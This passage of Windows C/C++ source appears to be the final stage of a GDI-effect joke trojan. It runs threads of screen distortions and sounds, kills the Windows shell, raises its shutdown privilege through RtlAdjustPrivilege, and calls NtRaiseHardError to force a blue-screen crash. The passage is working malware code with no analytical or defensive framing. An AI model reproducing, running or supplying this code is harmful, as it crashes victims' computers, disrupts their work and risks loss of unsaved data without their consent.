			Refresh();
			Sleep(1000);
			HANDLE h = CreateThread(0, 0, PRGBPat, 0, 0, 0);
			HANDLE hh = CreateThread(0, 0, LoadCursor1, 0, 0, 0);
			SoundEffect8();
			Sleep(30000);
			TerminatePayload(h);
			TerminatePayload(hh);
			Refresh();
			Sleep(1000);
			HANDLE i = CreateThread(0, 0, TauWaves, 0, 0, 0);
			SoundEffect9();
			Sleep(30000);
			TerminatePayload(i);
			Refresh();
			Sleep(2000);
			TerminatePayload(cursorcube);
			HANDLE j = CreateThread(0, 0, RoundRectRgnInvert1, 0, 0, 0);
			HANDLE jj = CreateThread(0, 0, PRGBPat, 0, 0, 0);
			HANDLE jjj = CreateThread(0, 0, Pixelation, 0, 0, 0);
			HANDLE jjjj = CreateThread(0, 0, StretchBlt1, 0, 0, 0);
			NeuroFunk();
			Sleep(33000);
			TerminatePayload(j);
			TerminatePayload(jj);
			TerminatePayload(jjj);
			TerminatePayload(jjjj);
			Refresh();
			TerminateWindowsShell();
			Sleep(1000);
			HANDLE k = CreateThread(0, 0, Statik, 0, 0, 0);
			Noise();
			Sleep(3000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC000014F, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
